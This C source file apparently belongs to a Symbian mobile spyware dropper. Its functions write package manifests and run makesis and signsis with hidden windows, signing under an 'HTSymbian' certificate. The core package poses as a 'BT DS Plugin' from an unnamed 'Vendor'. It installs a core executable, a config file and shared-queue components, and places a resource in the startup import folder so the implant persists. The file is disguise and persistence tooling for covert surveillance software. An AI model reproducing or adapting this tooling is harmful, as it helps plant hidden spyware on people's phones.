#include "stdafx.h"
#include <Windows.h>
#include "dropper.h"

const char pkg_uninstall[] = "#{\"%S\"},(0x200305DB),1,0,0\r\n"
							 "%%{\"Vendor-EN\"}\r\n"
							 ":\"Vendor\"\r\n"
							 "\"%S.exe\" - \"C:\\sys\\bin\\%S.exe\"\r\n";


const char pkg_core[] = "#{\"BT DS Plugin\"},(0x200305D7),1,00,0000\r\n"
						"%%{\"Vendor-EN\"}\r\n"
						":\"Vendor\"\r\n"
						";Supports 3rd\r\n"
						"[0x101F7961], 0, 0, 0,{\"Series60ProductID\"}\r\n"
						";Supports 3rd FP1\r\n"
						"[0x102032BE], 0, 0, 0,{\"Series60ProductID\"}\r\n"
						";Supports 3rd FP2\r\n"
						"[0x102752AE], 0, 0, 0,{\"Series60ProductID\"}\r\n"
						";Supports 5th\r\n"
						"[0x1028315F], 0, 0, 0,{\"Series60ProductID\"}\r\n"
						"\"Core_20030635.exe\" - \"c:\\sys\\bin\\Core_20030635.exe\"\r\n"
						"\"config.bin\" - \"c:\\private\\20030635\\config.bin\"\r\n"
						"\"SharedQueueCli_20030633.dll\" - \"c:\\sys\\bin\\SharedQueueCli_20030633.dll\"\r\n"
						"\"SharedQueueSrv_20030634.exe\" - \"c:\\sys\\bin\\SharedQueueSrv_20030634.exe\"\r\n"
						"\"Uninstaller.SISX\" - \"c:\\sys\\bin\\Uninstaller.SISX\"\r\n"
						"\"200305D7.rsc\" - \"c:\\private\\101f875a\\import\\[200305D7].rsc\"\r\n\r\n";

BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey)
{
	char				szComm[2048];
	STARTUPINFOA		start_Info;
	PROCESS_INFORMATION proc_Info;
	SECURITY_ATTRIBUTES sSec_attrib;
	DWORD				dwRetCode, dwRet;
	BOOL				bRet = FALSE;
	WCHAR				wsFileSis[MAX_PATH];
	WCHAR				wsFileName[MAX_PATH];
	WCHAR *p;

	// trim the file extension
	wsprintf(wsFileName, L"%s", wsFile);

	if ((p = wcschr(wsFileName, L'.')) != NULL)
		*p = 0;

	wsprintf(wsFileSis, L"%s.SIS", wsFileName);

	ZeroMemory(szComm, sizeof(szComm));	
	ZeroMemory(&start_Info,  sizeof(start_Info));
	ZeroMemory(&proc_Info,   sizeof(proc_Info));
	ZeroMemory(&sSec_attrib, sizeof(sSec_attrib));

	sSec_attrib.bInheritHandle = true;
	sSec_attrib.nLength = sizeof(sSec_attrib);

	start_Info.cb = sizeof(start_Info);
	start_Info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	start_Info.wShowWindow = SW_HIDE;

	sprintf_s(szComm, sizeof(szComm), "\"signsis.exe\" %S %S.SISX %S %S HTSymbian", wsFileSis, wsFileName, wsCert, wsKey);

	if ((bRet = CreateProcessA(NULL, szComm, 0, 0, true, 0, 0, 0, &start_Info, &proc_Info)) == false)
		return bRet;

	if( proc_Info.hProcess != INVALID_HANDLE_VALUE ) {
		dwRet = WaitForSingleObject(proc_Info.hProcess, 600000);
		GetExitCodeProcess(proc_Info.hProcess, &dwRetCode);
	}

	if( !bRet || dwRet == WAIT_TIMEOUT || dwRetCode != 0 ) { 
		DWORD ret = GetLastError();
		return false;
	} 

	DeleteFile(wsFileSis);

	return true;
}


BOOL CreateSis(UINT flag, TCHAR *wsFile)
{
	char				szComm[2048];
	STARTUPINFOA		start_Info;
	PROCESS_INFORMATION proc_Info;
	SECURITY_ATTRIBUTES sSec_attrib;
	DWORD				dwRetCode, dwRet;
	BOOL				bRet = FALSE;
	HANDLE				hFile;
	CHAR				buff[1024];
	WCHAR				wsFilePkg[MAX_PATH];
	WCHAR				wsFileName[MAX_PATH];
	WCHAR *p;

	// trim the file extension
	wsprintf(wsFileName, L"%s", wsFile);

	if ((p = wcschr(wsFileName, L'.')) != NULL)
		*p = 0;

	// name of the package
	wsprintf(wsFilePkg, L"%s.pkg", wsFileName);

	if ((hFile = CreateFile(wsFilePkg, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return FALSE;

	ZeroMemory(buff, sizeof(buff));

	switch(flag){
		case SIS_UNINST:
			sprintf_s(buff, sizeof(buff), pkg_uninstall, wsFileName, wsFileName, wsFileName);
			break;
		case SIS_CORE:
			sprintf_s(buff, sizeof(buff), pkg_core, wsFileName, wsFileName);
			break;
	}

	WriteFile(hFile, buff, strlen(buff), &dwRet, NULL);

	CloseHandle(hFile);

	ZeroMemory(szComm, sizeof(szComm));	
	ZeroMemory(&start_Info,  sizeof(start_Info));
	ZeroMemory(&proc_Info,   sizeof(proc_Info));
	ZeroMemory(&sSec_attrib, sizeof(sSec_attrib));

	sSec_attrib.bInheritHandle = true;
	sSec_attrib.nLength = sizeof(sSec_attrib);

	start_Info.cb = sizeof(start_Info);
	start_Info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	start_Info.wShowWindow = SW_HIDE;

	sprintf_s(szComm, sizeof(szComm), "\"makesis.exe\" %S", wsFilePkg);

	if ((bRet = CreateProcessA(NULL, szComm, 0, 0, true, 0, 0, 0, &start_Info, &proc_Info)) == false) {
		DeleteFile(wsFilePkg);
		return bRet;
	}

	if( proc_Info.hProcess != INVALID_HANDLE_VALUE ) {
		dwRet = WaitForSingleObject(proc_Info.hProcess, 600000);
		GetExitCodeProcess(proc_Info.hProcess, &dwRetCode);
	}

	if( !bRet || dwRet == WAIT_TIMEOUT || dwRetCode != 0 ) { 
		DWORD ret = GetLastError();
		DeleteFile(wsFilePkg);
		return false;
	} 

	DeleteFile(wsFilePkg);
	return true;
}


